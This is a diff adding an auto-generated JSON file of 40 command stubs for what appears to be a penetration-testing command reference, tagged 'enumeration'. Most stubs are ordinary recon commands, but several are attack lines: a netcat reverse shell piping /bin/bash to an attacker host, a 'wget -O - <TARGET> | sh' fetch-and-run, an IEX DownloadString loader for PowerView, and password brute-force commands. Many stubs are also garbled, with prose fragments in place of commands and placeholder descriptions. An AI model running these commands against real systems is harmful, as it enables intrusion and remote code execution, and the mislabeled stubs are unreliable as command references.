@@ -1,0 +1,1306 @@
+{
+  "metadata": {
+    "generated": "2025-11-09",
+    "source": "bulk_create_stubs.py",
+    "purpose": "Auto-generated command stubs for missing references",
+    "status": "needs-manual-enrichment",
+    "count": 40,
+    "category": "enumeration"
+  },
+  "commands": [
+    {
+      "id": "arp-scan-list",
+      "command": "arp-scan -l",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "arp-scan",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for arp-scan",
+      "output_analysis": [
+        "Review arp-scan output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to nmap-ping-sweep"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/recon.json",
+      "name": "Arp Scan List"
+    },
+    {
+      "id": "bloodhound",
+      "command": "BloodHound <TARGET>",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "bloodhound",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for BloodHound",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review BloodHound output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to bloodhound-ingest"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/generated/active-directory-additions.json",
+      "name": "BloodHound"
+    },
+    {
+      "id": "curl",
+      "command": "curl -s <URL>/readme.html",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "curl",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for curl",
+      "variables": [
+        {
+          "name": "<URL>",
+          "description": "Target URL",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review curl output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to wordpress-manual-version"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/web/wordpress.json",
+      "name": "Curl"
+    },
+    {
+      "id": "dig",
+      "command": "dig <TARGET>",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "dig",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for dig",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review dig output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to dns-exfiltration"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/post-exploit/general-transfer.json",
+      "name": "Dig"
+    },
+    {
+      "id": "dirb",
+      "command": "dirb <URL>",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "dirb",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for dirb",
+      "variables": [
+        {
+          "name": "<URL>",
+          "description": "Target URL",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review dirb output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to gobuster-dir"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/web/general.json",
+      "name": "Dirb"
+    },
+    {
+      "id": "dirb-list",
+      "command": "dirb http://<TARGET> <WORDLIST>",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "dirb",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for dirb",
+      "variables": [
+        {
+          "name": "<WORDLIST>",
+          "description": "Path to wordlist file",
+          "example": "",
+          "required": true
+        },
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review dirb output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to msf-aux-http-dir-scanner"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/exploitation/metasploit-auxiliary.json",
+      "name": "Dirb List"
+    },
+    {
+      "id": "enum4linux",
+      "command": "enum4linux - <TARGET> SMB/CIFS enumeration script",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "enum4linux",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for enum4linux",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review enum4linux output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to smbclient-list-shares"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/pivoting/linux-utilities.json",
+      "name": "Enum4linux"
+    },
+    {
+      "id": "fallback",
+      "command": "Fallback <TARGET> SUID enumeration if capabilities fail",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "fallback",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for Fallback",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review Fallback output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to execute-cap-exploit"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/post-exploit/linux-capabilities-commands.json",
+      "name": "Fallback"
+    },
+    {
+      "id": "ffuf-list",
+      "command": "ffuf -w <WORDLIST>:FUZZ -X POST -d \"fm_usr=<USER>&fm_pwd=FUZZ\" -H \"Content-Type: application/x-www-form-urlencoded\" -u http://<TARGET>/<PAGE> -fr \"<FAIL_STRING>\"",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "ffuf",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for ffuf",
+      "variables": [
+        {
+          "name": "<USER>",
+          "description": "USER value",
+          "example": "",
+          "required": true
+        },
+        {
+          "name": "<PAGE>",
+          "description": "PAGE value",
+          "example": "",
+          "required": true
+        },
+        {
+          "name": "<WORDLIST>",
+          "description": "Path to wordlist file",
+          "example": "",
+          "required": true
+        },
+        {
+          "name": "<FAIL_STRING>",
+          "description": "FAIL_STRING value",
+          "example": "",
+          "required": true
+        },
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review ffuf output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to hydra-http-post-form"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/enumeration/password-attacks-hydra.json",
+      "name": "Ffuf List"
+    },
+    {
+      "id": "fierce",
+      "command": "fierce --domain <DOMAIN>",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "fierce",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for fierce",
+      "variables": [
+        {
+          "name": "<DOMAIN>",
+          "description": "Target domain name",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review fierce output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to dns-enum"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/recon.json",
+      "name": "Fierce"
+    },
+    {
+      "id": "fping",
+      "command": "fping -a -g <TARGET_SUBNET>",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "fping",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for fping",
+      "variables": [
+        {
+          "name": "<TARGET_SUBNET>",
+          "description": "Target subnet (e.g., 192.168.1.0/24)",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review fping output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to nmap-ping-sweep"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/recon.json",
+      "name": "Fping"
+    },
+    {
+      "id": "host",
+      "command": "host -t axfr <DOMAIN> <NS>",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "host",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for host",
+      "variables": [
+        {
+          "name": "<DOMAIN>",
+          "description": "Target domain name",
+          "example": "",
+          "required": true
+        },
+        {
+          "name": "<NS>",
+          "description": "DNS nameserver",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review host output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to dns-enum"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/recon.json",
+      "name": "Host"
+    },
+    {
+      "id": "identify",
+      "command": "Identify <TARGET> from nmap scan or version research",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "identify",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for Identify",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review Identify output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to searchsploit-cve-lookup"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/exploitation/general.json",
+      "name": "Identify"
+    },
+    {
+      "id": "ldapsearch",
+      "command": "ldapsearch -x -H ldap://<DC> -b 'DC=corp,DC=com' '(objectClass=user)'",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "ldapsearch",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for ldapsearch",
+      "variables": [
+        {
+          "name": "<DC>",
+          "description": "DC value",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review ldapsearch output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to net-user-domain-list"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/enumeration/ad-legacy-enumeration.json",
+      "name": "Ldapsearch"
+    },
+    {
+      "id": "manual",
+      "command": "Manual <TARGET> commands",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "manual",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for Manual",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review Manual output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to win-privesc-winpeas"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/post-exploit/windows.json",
+      "name": "Manual"
+    },
+    {
+      "id": "masscan",
+      "command": "masscan -p <PORTS> <TARGET>",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "masscan",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for masscan",
+      "variables": [
+        {
+          "name": "<PORTS>",
+          "description": "Port range (e.g., 1-1000, 80,443)",
+          "example": "",
+          "required": true
+        },
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review masscan output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to msf-aux-portscan-tcp"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/exploitation/metasploit-auxiliary.json",
+      "name": "Masscan"
+    },
+    {
+      "id": "nc",
+      "command": "nc <LHOST> <LPORT> | /bin/bash | nc <LHOST> <LPORT+1>",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "nc",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for nc",
+      "variables": [
+        {
+          "name": "<LPORT>",
+          "description": "Local/attacker port number",
+          "example": "",
+          "required": true
+        },
+        {
+          "name": "<LHOST>",
+          "description": "Local/attacker IP address",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review nc output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to nc-reverse-shell"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/exploitation/general.json",
+      "name": "Nc"
+    },
+    {
+      "id": "nc-list",
+      "command": "nc -lvnp <LPORT> (listener on attacker)",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "nc",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for nc",
+      "variables": [
+        {
+          "name": "<LPORT>",
+          "description": "Local/attacker port number",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review nc output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to msfvenom-linux-shell"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/generated/exploitation-additions.json",
+      "name": "Nc List"
+    },
+    {
+      "id": "netcat",
+      "command": "Netcat <TARGET> on Kali (pre-installed)",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "netcat",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for Netcat",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review Netcat output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to nc-listener-tcp"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/exploitation/ad-lateral-movement-helpers.json",
+      "name": "Netcat"
+    },
+    {
+      "id": "netcat-list",
+      "command": "Netcat listener ready: nc -lvnp <LPORT>",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "netcat",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for Netcat",
+      "variables": [
+        {
+          "name": "<LPORT>",
+          "description": "Local/attacker port number",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review Netcat output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to revshell-ps-generator"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/exploitation/ad-lateral-movement-helpers.json",
+      "name": "Netcat List"
+    },
+    {
+      "id": "nmap-list",
+      "command": "nmap --script mysql-brute --script-args userdb=users.txt,passdb=<WORDLIST> <TARGET>",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "nmap",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for nmap",
+      "variables": [
+        {
+          "name": "<WORDLIST>",
+          "description": "Path to wordlist file",
+          "example": "",
+          "required": true
+        },
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review nmap output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to msf-aux-mysql-login"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/exploitation/metasploit-auxiliary.json",
+      "name": "Nmap List"
+    },
+    {
+      "id": "nmap-show",
+      "command": "nmap --script <TARGET>",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "nmap",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for nmap",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review nmap output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to linux-nfs-no-root-squash"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/post-exploit/linux.json",
+      "name": "Nmap Show"
+    },
+    {
+      "id": "nmap-smb-enum",
+      "command": "nmap-smb-enum - sudo nmap -p <PORT> --script=smb-enum-shares <TARGET>",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "nmap-smb-enum",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for nmap-smb-enum",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        },
+        {
+          "name": "<PORT>",
+          "description": "SMB port to scan",
+          "example": "445",
+          "required": false
+        }
+      ],
+      "output_analysis": [
+        "Review nmap-smb-enum output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to smbclient-list-shares"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/pivoting/linux-utilities.json",
+      "name": "Nmap SMB Enum"
+    },
+    {
+      "id": "onesixtyone-list",
+      "command": "onesixtyone -c <WORDLIST> <TARGET>",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "onesixtyone",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for onesixtyone",
+      "variables": [
+        {
+          "name": "<WORDLIST>",
+          "description": "Path to wordlist file",
+          "example": "",
+          "required": true
+        },
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review onesixtyone output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to snmp-enum"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/recon.json",
+      "name": "Onesixtyone List"
+    },
+    {
+      "id": "output",
+      "command": "Output <TARGET> getcap enumeration",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "output",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for Output",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review Output output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to filter-exploitable-caps"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/post-exploit/linux-capabilities-commands.json",
+      "name": "Output"
+    },
+    {
+      "id": "powerview",
+      "command": "PowerView <TARGET> Import-Module .\\PowerView.ps1 or IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "powerview",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for PowerView",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review PowerView output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to powerview-get-domaingroup-recursive"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/enumeration/ad-powershell-nested-groups.json",
+      "name": "Powerview"
+    },
+    {
+      "id": "powerview-check",
+      "command": "PowerView <TARGET> (if checking version)",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "powerview",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for PowerView",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review PowerView output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to ps-compare-powerview-versions"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/enumeration/ad-powershell-nested-groups.json",
+      "name": "Powerview Check"
+    },
+    {
+      "id": "quick",
+      "command": "Quick <TARGET> first: gobuster-dir-common (identify quick wins)",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "quick",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for Quick",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review Quick output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to gobuster-dir-custom"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/exploitation/general.json",
+      "name": "Quick"
+    },
+    {
+      "id": "smbclient",
+      "command": "smbclient <TARGET> sudo apt install smbclient",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "smbclient",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for smbclient",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review smbclient output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to smbclient-list-shares"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/pivoting/linux-utilities.json",
+      "name": "Smbclient"
+    },
+    {
+      "id": "smbclient-check",
+      "command": "smbclient -U <USER> -L //<TARGET> (manual testing)",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "smbclient",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for smbclient",
+      "variables": [
+        {
+          "name": "<USER>",
+          "description": "USER value",
+          "example": "",
+          "required": true
+        },
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review smbclient output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to hydra-smb-attack"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/enumeration/password-attacks-hydra.json",
+      "name": "Smbclient Check"
+    },
+    {
+      "id": "smbmap",
+      "command": "smbmap -H <TARGET>",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "smbmap",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for smbmap",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review smbmap output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to smb-enum"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/recon.json",
+      "name": "Smbmap"
+    },
+    {
+      "id": "smbmap-enumerate",
+      "command": "smbmap-enumerate - smbmap -H <TARGET> -u '' (alternative SMB enumeration)",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "smbmap-enumerate",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for smbmap-enumerate",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review smbmap-enumerate output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to smbclient-list-shares"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/pivoting/linux-utilities.json",
+      "name": "Smbmap Enumerate"
+    },
+    {
+      "id": "snmp-check",
+      "command": "snmp-check <TARGET>",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "snmp-check",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for snmp-check",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review snmp-check output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to snmp-enum"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/recon.json",
+      "name": "Snmp Check"
+    },
+    {
+      "id": "snmpbulkwalk",
+      "command": "snmpbulkwalk -c <SNMP_COMMUNITY> <TARGET>",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "snmpbulkwalk",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for snmpbulkwalk",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        },
+        {
+          "name": "<SNMP_COMMUNITY>",
+          "description": "SNMP community string",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review snmpbulkwalk output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to snmp-enum"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/recon.json",
+      "name": "Snmpbulkwalk"
+    },
+    {
+      "id": "unicornscan",
+      "command": "unicornscan -mS <TARGET>",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "unicornscan",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for unicornscan",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review unicornscan output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to nmap-service-scan"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/recon.json",
+      "name": "Unicornscan"
+    },
+    {
+      "id": "wfuzz-list",
+      "command": "wfuzz -u <URL>/FUZZ -w <WORDLIST>",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "wfuzz",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for wfuzz",
+      "variables": [
+        {
+          "name": "<URL>",
+          "description": "Target URL",
+          "example": "",
+          "required": true
+        },
+        {
+          "name": "<WORDLIST>",
+          "description": "Path to wordlist file",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review wfuzz output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to gobuster-dir"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/web/general.json",
+      "name": "Wfuzz List"
+    },
+    {
+      "id": "wget",
+      "command": "wget --post-data '<PARAM>=<VALUE>' <URL>",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "wget",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for wget",
+      "variables": [
+        {
+          "name": "<PARAM>",
+          "description": "PARAM value",
+          "example": "",
+          "required": true
+        },
+        {
+          "name": "<VALUE>",
+          "description": "VALUE value",
+          "example": "",
+          "required": true
+        },
+        {
+          "name": "<URL>",
+          "description": "Target URL",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review wget output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to curl-post"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/web/general.json",
+      "name": "Wget"
+    },
+    {
+      "id": "wget-check",
+      "command": "wget -O - <TARGET> | sh",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "wget",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for wget",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review wget output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to linux-linpeas"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/post-exploit/linux.json",
+      "name": "Wget Check"
+    },
+    {
+      "id": "wpscan",
+      "command": "wpscan --enumerate <TARGET> (vulnerable only)",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "wpscan",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for wpscan",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review wpscan output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to wpscan-aggressive-detection"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/web/wordpress.json",
